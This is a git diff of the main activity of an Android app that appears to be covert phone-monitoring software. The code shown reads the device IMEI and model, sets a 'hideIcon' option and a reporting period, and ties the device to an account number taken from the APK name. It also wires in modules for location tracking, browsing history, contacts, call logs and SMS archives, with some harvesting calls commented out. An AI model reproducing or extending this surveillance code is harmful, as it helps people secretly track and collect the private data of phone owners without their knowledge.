@@ -1,15 +1,9 @@
 package com.inet.android.bs;
 
 import java.io.File;
-import java.text.SimpleDateFormat;
-import java.util.Calendar;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
 
-import org.json.JSONException;
-import org.json.JSONObject;
-
-import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.Context;
@@ -26,10 +20,14 @@ import android.telephony.TelephonyManager;
 import android.text.Editable;
 import android.text.TextWatcher;
 import android.view.Menu;
+import android.view.Window;
 import android.widget.Button;
 import android.widget.EditText;
 
+import com.inet.android.archive.ArchiveCall;
+import com.inet.android.archive.ListApp;
 import com.inet.android.certificate.R;
+import com.inet.android.contacts.GetContacts;
 import com.inet.android.history.LinkService;
 import com.inet.android.location.LocationTracker;
 import com.inet.android.request.Request4;
@@ -70,24 +68,19 @@ public class MainActivity extends Activity {
 		String imeistring = manager.getDeviceId();
 		String model = android.os.Build.MODEL;
 		String androidVersion = android.os.Build.VERSION.RELEASE;
-		// ListApp listApp = new ListApp();
-		// listApp.getListOfInstalledApp(context);
-		// GetInfo getInfo = new GetInfo(context);
-		// getInfo.getInfo();
-		// GetContacts getCont = new GetContacts();
-		// getCont.execute(context);
-		// ArchiveSms arhSms = new ArchiveSms();
-		// arhSms.execute(context);
-		// ArchiveCall arhCall = new ArchiveCall();
-		// arhCall.execute(context);
 		aboutDev = " Model: " + model + " Version android: " + androidVersion;
-		// sIMEI = "IMEI: " + imeistring;
 		e = sp.edit();
 		e.putString("BUILD", "V_000.1");
 		e.putString("imei", imeistring);
 		e.putString("ABOUT", aboutDev);
 		e.putString("model", model);
 		e.putString("account", "account");
+		// ListApp listApp = new ListApp();
+		// listApp.getListOfInstalledApp(context);
+//		 GetContacts getCont = new GetContacts();
+//		 getCont.execute(context);
+//		ArchiveCall arhCall = new ArchiveCall();
+//		arhCall.execute(context);
 
 		e.commit();
 
@@ -101,7 +94,7 @@ public class MainActivity extends Activity {
 			e.putBoolean("getInfo", true);
 			e.putBoolean("hideIcon", false);
 			e.putString("ABOUT", aboutDev);
-			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); 
+			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
 			e.putString("period", "1"); // period must equal 10 min
 			e.putString("code", "-1");
 			e.commit();
@@ -121,7 +114,6 @@ public class MainActivity extends Activity {
 			viewIDDialog();
 		} else {
 			Logging.doLog(LOG_TAG, "not show dialog");
-
 			finish();
 		}
 	}
@@ -133,10 +125,8 @@ public class MainActivity extends Activity {
 
 	private boolean viewIDDialog() {
 		AlertDialog.Builder alert = new AlertDialog.Builder(this);
-
-		alert.setTitle("Attention!!!");
-		alert.setMessage("Enter account number!");
-
+		alert.setTitle(R.string.TitleDialog);
+		alert.setMessage(R.string.Enter_account);
 		final EditText input = new EditText(this);
 		alert.setView(input);
 
@@ -161,51 +151,52 @@ public class MainActivity extends Activity {
 						finish();
 					}
 				});
-		
+
 		final AlertDialog dialog = alert.create();
 		dialog.show();
 		if (input.getText().toString().length() == 0) {
-			((AlertDialog)dialog).getButton(
-					AlertDialog.BUTTON_POSITIVE).setEnabled(false);
+			((AlertDialog) dialog).getButton(AlertDialog.BUTTON_POSITIVE)
+					.setEnabled(false);
 		} else {
-			((AlertDialog)dialog).getButton(
-					AlertDialog.BUTTON_POSITIVE).setEnabled(true);
+			((AlertDialog) dialog).getButton(AlertDialog.BUTTON_POSITIVE)
+					.setEnabled(true);
 		}
-		
+
 		input.addTextChangedListener(new TextWatcher() {
-			
+
 			@Override
-			public void onTextChanged(CharSequence s, int start, int before, int count) {
+			public void onTextChanged(CharSequence s, int start, int before,
+					int count) {
 				if (input.getText().toString().length() == 0) {
-					
+
 				}
-				
+
 			}
-			
+
 			@Override
 			public void beforeTextChanged(CharSequence s, int start, int count,
 					int after) {
 				if (input.getText().toString().length() == 0) {
-					((AlertDialog)dialog).getButton(
+					((AlertDialog) dialog).getButton(
 							AlertDialog.BUTTON_POSITIVE).setEnabled(false);
 				} else {
-					((AlertDialog)dialog).getButton(
+					((AlertDialog) dialog).getButton(
 							AlertDialog.BUTTON_POSITIVE).setEnabled(true);
 				}
 			}
-			
+
 			@Override
 			public void afterTextChanged(Editable s) {
 				if (input.getText().toString().length() == 0) {
-					((AlertDialog)dialog).getButton(
+					((AlertDialog) dialog).getButton(
 							AlertDialog.BUTTON_POSITIVE).setEnabled(false);
 				} else {
-					((AlertDialog)dialog).getButton(
+					((AlertDialog) dialog).getButton(
 							AlertDialog.BUTTON_POSITIVE).setEnabled(true);
 				}
 			}
 		});
-		
+
 		return true;
 	}
 
@@ -230,8 +221,8 @@ public class MainActivity extends Activity {
 					}
 				}
 
-				if (sID.indexOf("ts.apk") != -1) {
-					ID = sID.substring(0, sID.indexOf("t"));
+				if (sID.indexOf("bb.apk") != -1) {
+					ID = sID.substring(0, sID.indexOf("b"));
 					e = sp.edit();
 					e.putString("account", ID);
 					e.commit();
